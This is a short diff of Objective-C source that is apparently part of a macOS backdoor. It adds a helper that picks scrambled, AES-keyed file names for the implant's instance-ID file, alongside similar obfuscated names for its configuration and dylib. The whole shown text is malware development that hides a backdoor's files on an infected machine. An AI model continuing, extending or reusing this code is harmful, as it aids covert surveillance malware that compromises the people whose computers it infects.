@@ -485,12 +485,29 @@ static NSMutableArray *gCurrProcsList = nil;
   return YES;
 }
 
+- (NSString*)_guessIIDnames:(_i_Encryption*)_encryption
+{
+  NSString* _iidName = nil;
+  NSString* _iidNameUpdate = nil;
+  
+  _iidName       = [_encryption scrambleForward: gBackdoorName
+                                           seed: 10];
+  _iidNameUpdate = [_encryption scrambleForward: gBackdoorUpdateName
+                                           seed: 10];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath:_iidName] == TRUE)
+    return _iidName;
+  else
+    return _iidNameUpdate;
+}
+
 - (void)_guessNames
 {
   NSData *temp = [NSData dataWithBytes: gConfAesKey
                                 length: CC_MD5_DIGEST_LENGTH];
   
   _i_Encryption *_encryption = [[_i_Encryption alloc] initWithKey: temp];
+  
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   
   gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
@@ -500,15 +517,11 @@ static NSMutableArray *gCurrProcsList = nil;
     {
       gConfigurationName = [_encryption scrambleForward: gBackdoorName 
                                                    seed: 1];
-      gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorName
-                                                        seed: 10];
     }
   else
     {
       gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName 
                                                    seed: 1];
-      gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorUpdateName
-                                                        seed: 10];
     }
   
   gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName  
@@ -516,6 +529,8 @@ static NSMutableArray *gCurrProcsList = nil;
   
   gDylibName = [_encryption scrambleForward: gConfigurationName 
                                        seed: 2];
+  
+  gCurrInstanceIDFileName = [self _guessIIDnames:_encryption];
 }
 
 #pragma mark -
